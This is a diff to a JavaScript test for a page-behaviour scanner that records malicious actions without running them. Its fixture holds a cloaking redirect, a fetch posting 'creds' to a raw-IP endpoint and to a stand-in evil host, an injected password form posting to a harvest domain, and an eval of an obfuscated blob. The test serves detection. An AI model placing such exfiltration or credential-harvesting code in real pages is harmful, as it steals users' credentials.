@@ -6,8 +6,10 @@ test("records JS redirect, exfil fetch, and injected credential form without exe
     <script>
       // cloaking redirect
       window.location.href = "https://bit.ly/landing";
-      // exfil
-      fetch("https://exfil.evil.test/collect", { method: "POST", body: "creds" });
+      // exfil to a suspicious endpoint (raw IP) — the sketchy-destination pattern
+      fetch("http://185.220.101.45/collect", { method: "POST", body: "creds" });
+      // a benign off-site API call to an ordinary domain (must NOT read as exfil)
+      fetch("https://api.partner-cdn.com/v1/telemetry", { method: "POST", body: "x" });
       // inject a credential form that posts off-origin
       document.write('<form action="https://harvest.evil.test/p" method="post"><input type="password" name="pw"></form>');
       // decode + eval an obfuscated blob
@@ -20,13 +22,15 @@ test("records JS redirect, exfil fetch, and injected credential form without exe
 
   // Behavior recorded, nothing actually ran.
   expect(report.redirects).toContain("https://bit.ly/landing");
-  expect(report.network.some((n) => n.kind === "fetch" && n.url === "https://exfil.evil.test/collect")).toBe(true);
+  expect(report.network.some((n) => n.kind === "fetch" && n.url === "http://185.220.101.45/collect")).toBe(true);
   expect(report.writes.some((w) => w.includes("harvest.evil.test"))).toBe(true);
   expect(report.evals.length).toBeGreaterThan(0);
   expect(report.decoded).toContain("alert(1)");
 
   const ruleIds = findings.map((f) => f.ruleId);
+  // The suspicious (raw-IP) destination is exfil; the ordinary domain is just a note.
   expect(ruleIds).toContain("runtime_offsite_exfil");
+  expect(ruleIds).toContain("runtime_offsite_request");
   expect(ruleIds).toContain("runtime_offsite_redirect");
   // The injected form is re-scanned by the static engine -> existing rule fires.
   expect(ruleIds).toContain("credential_form_posts_off_origin");
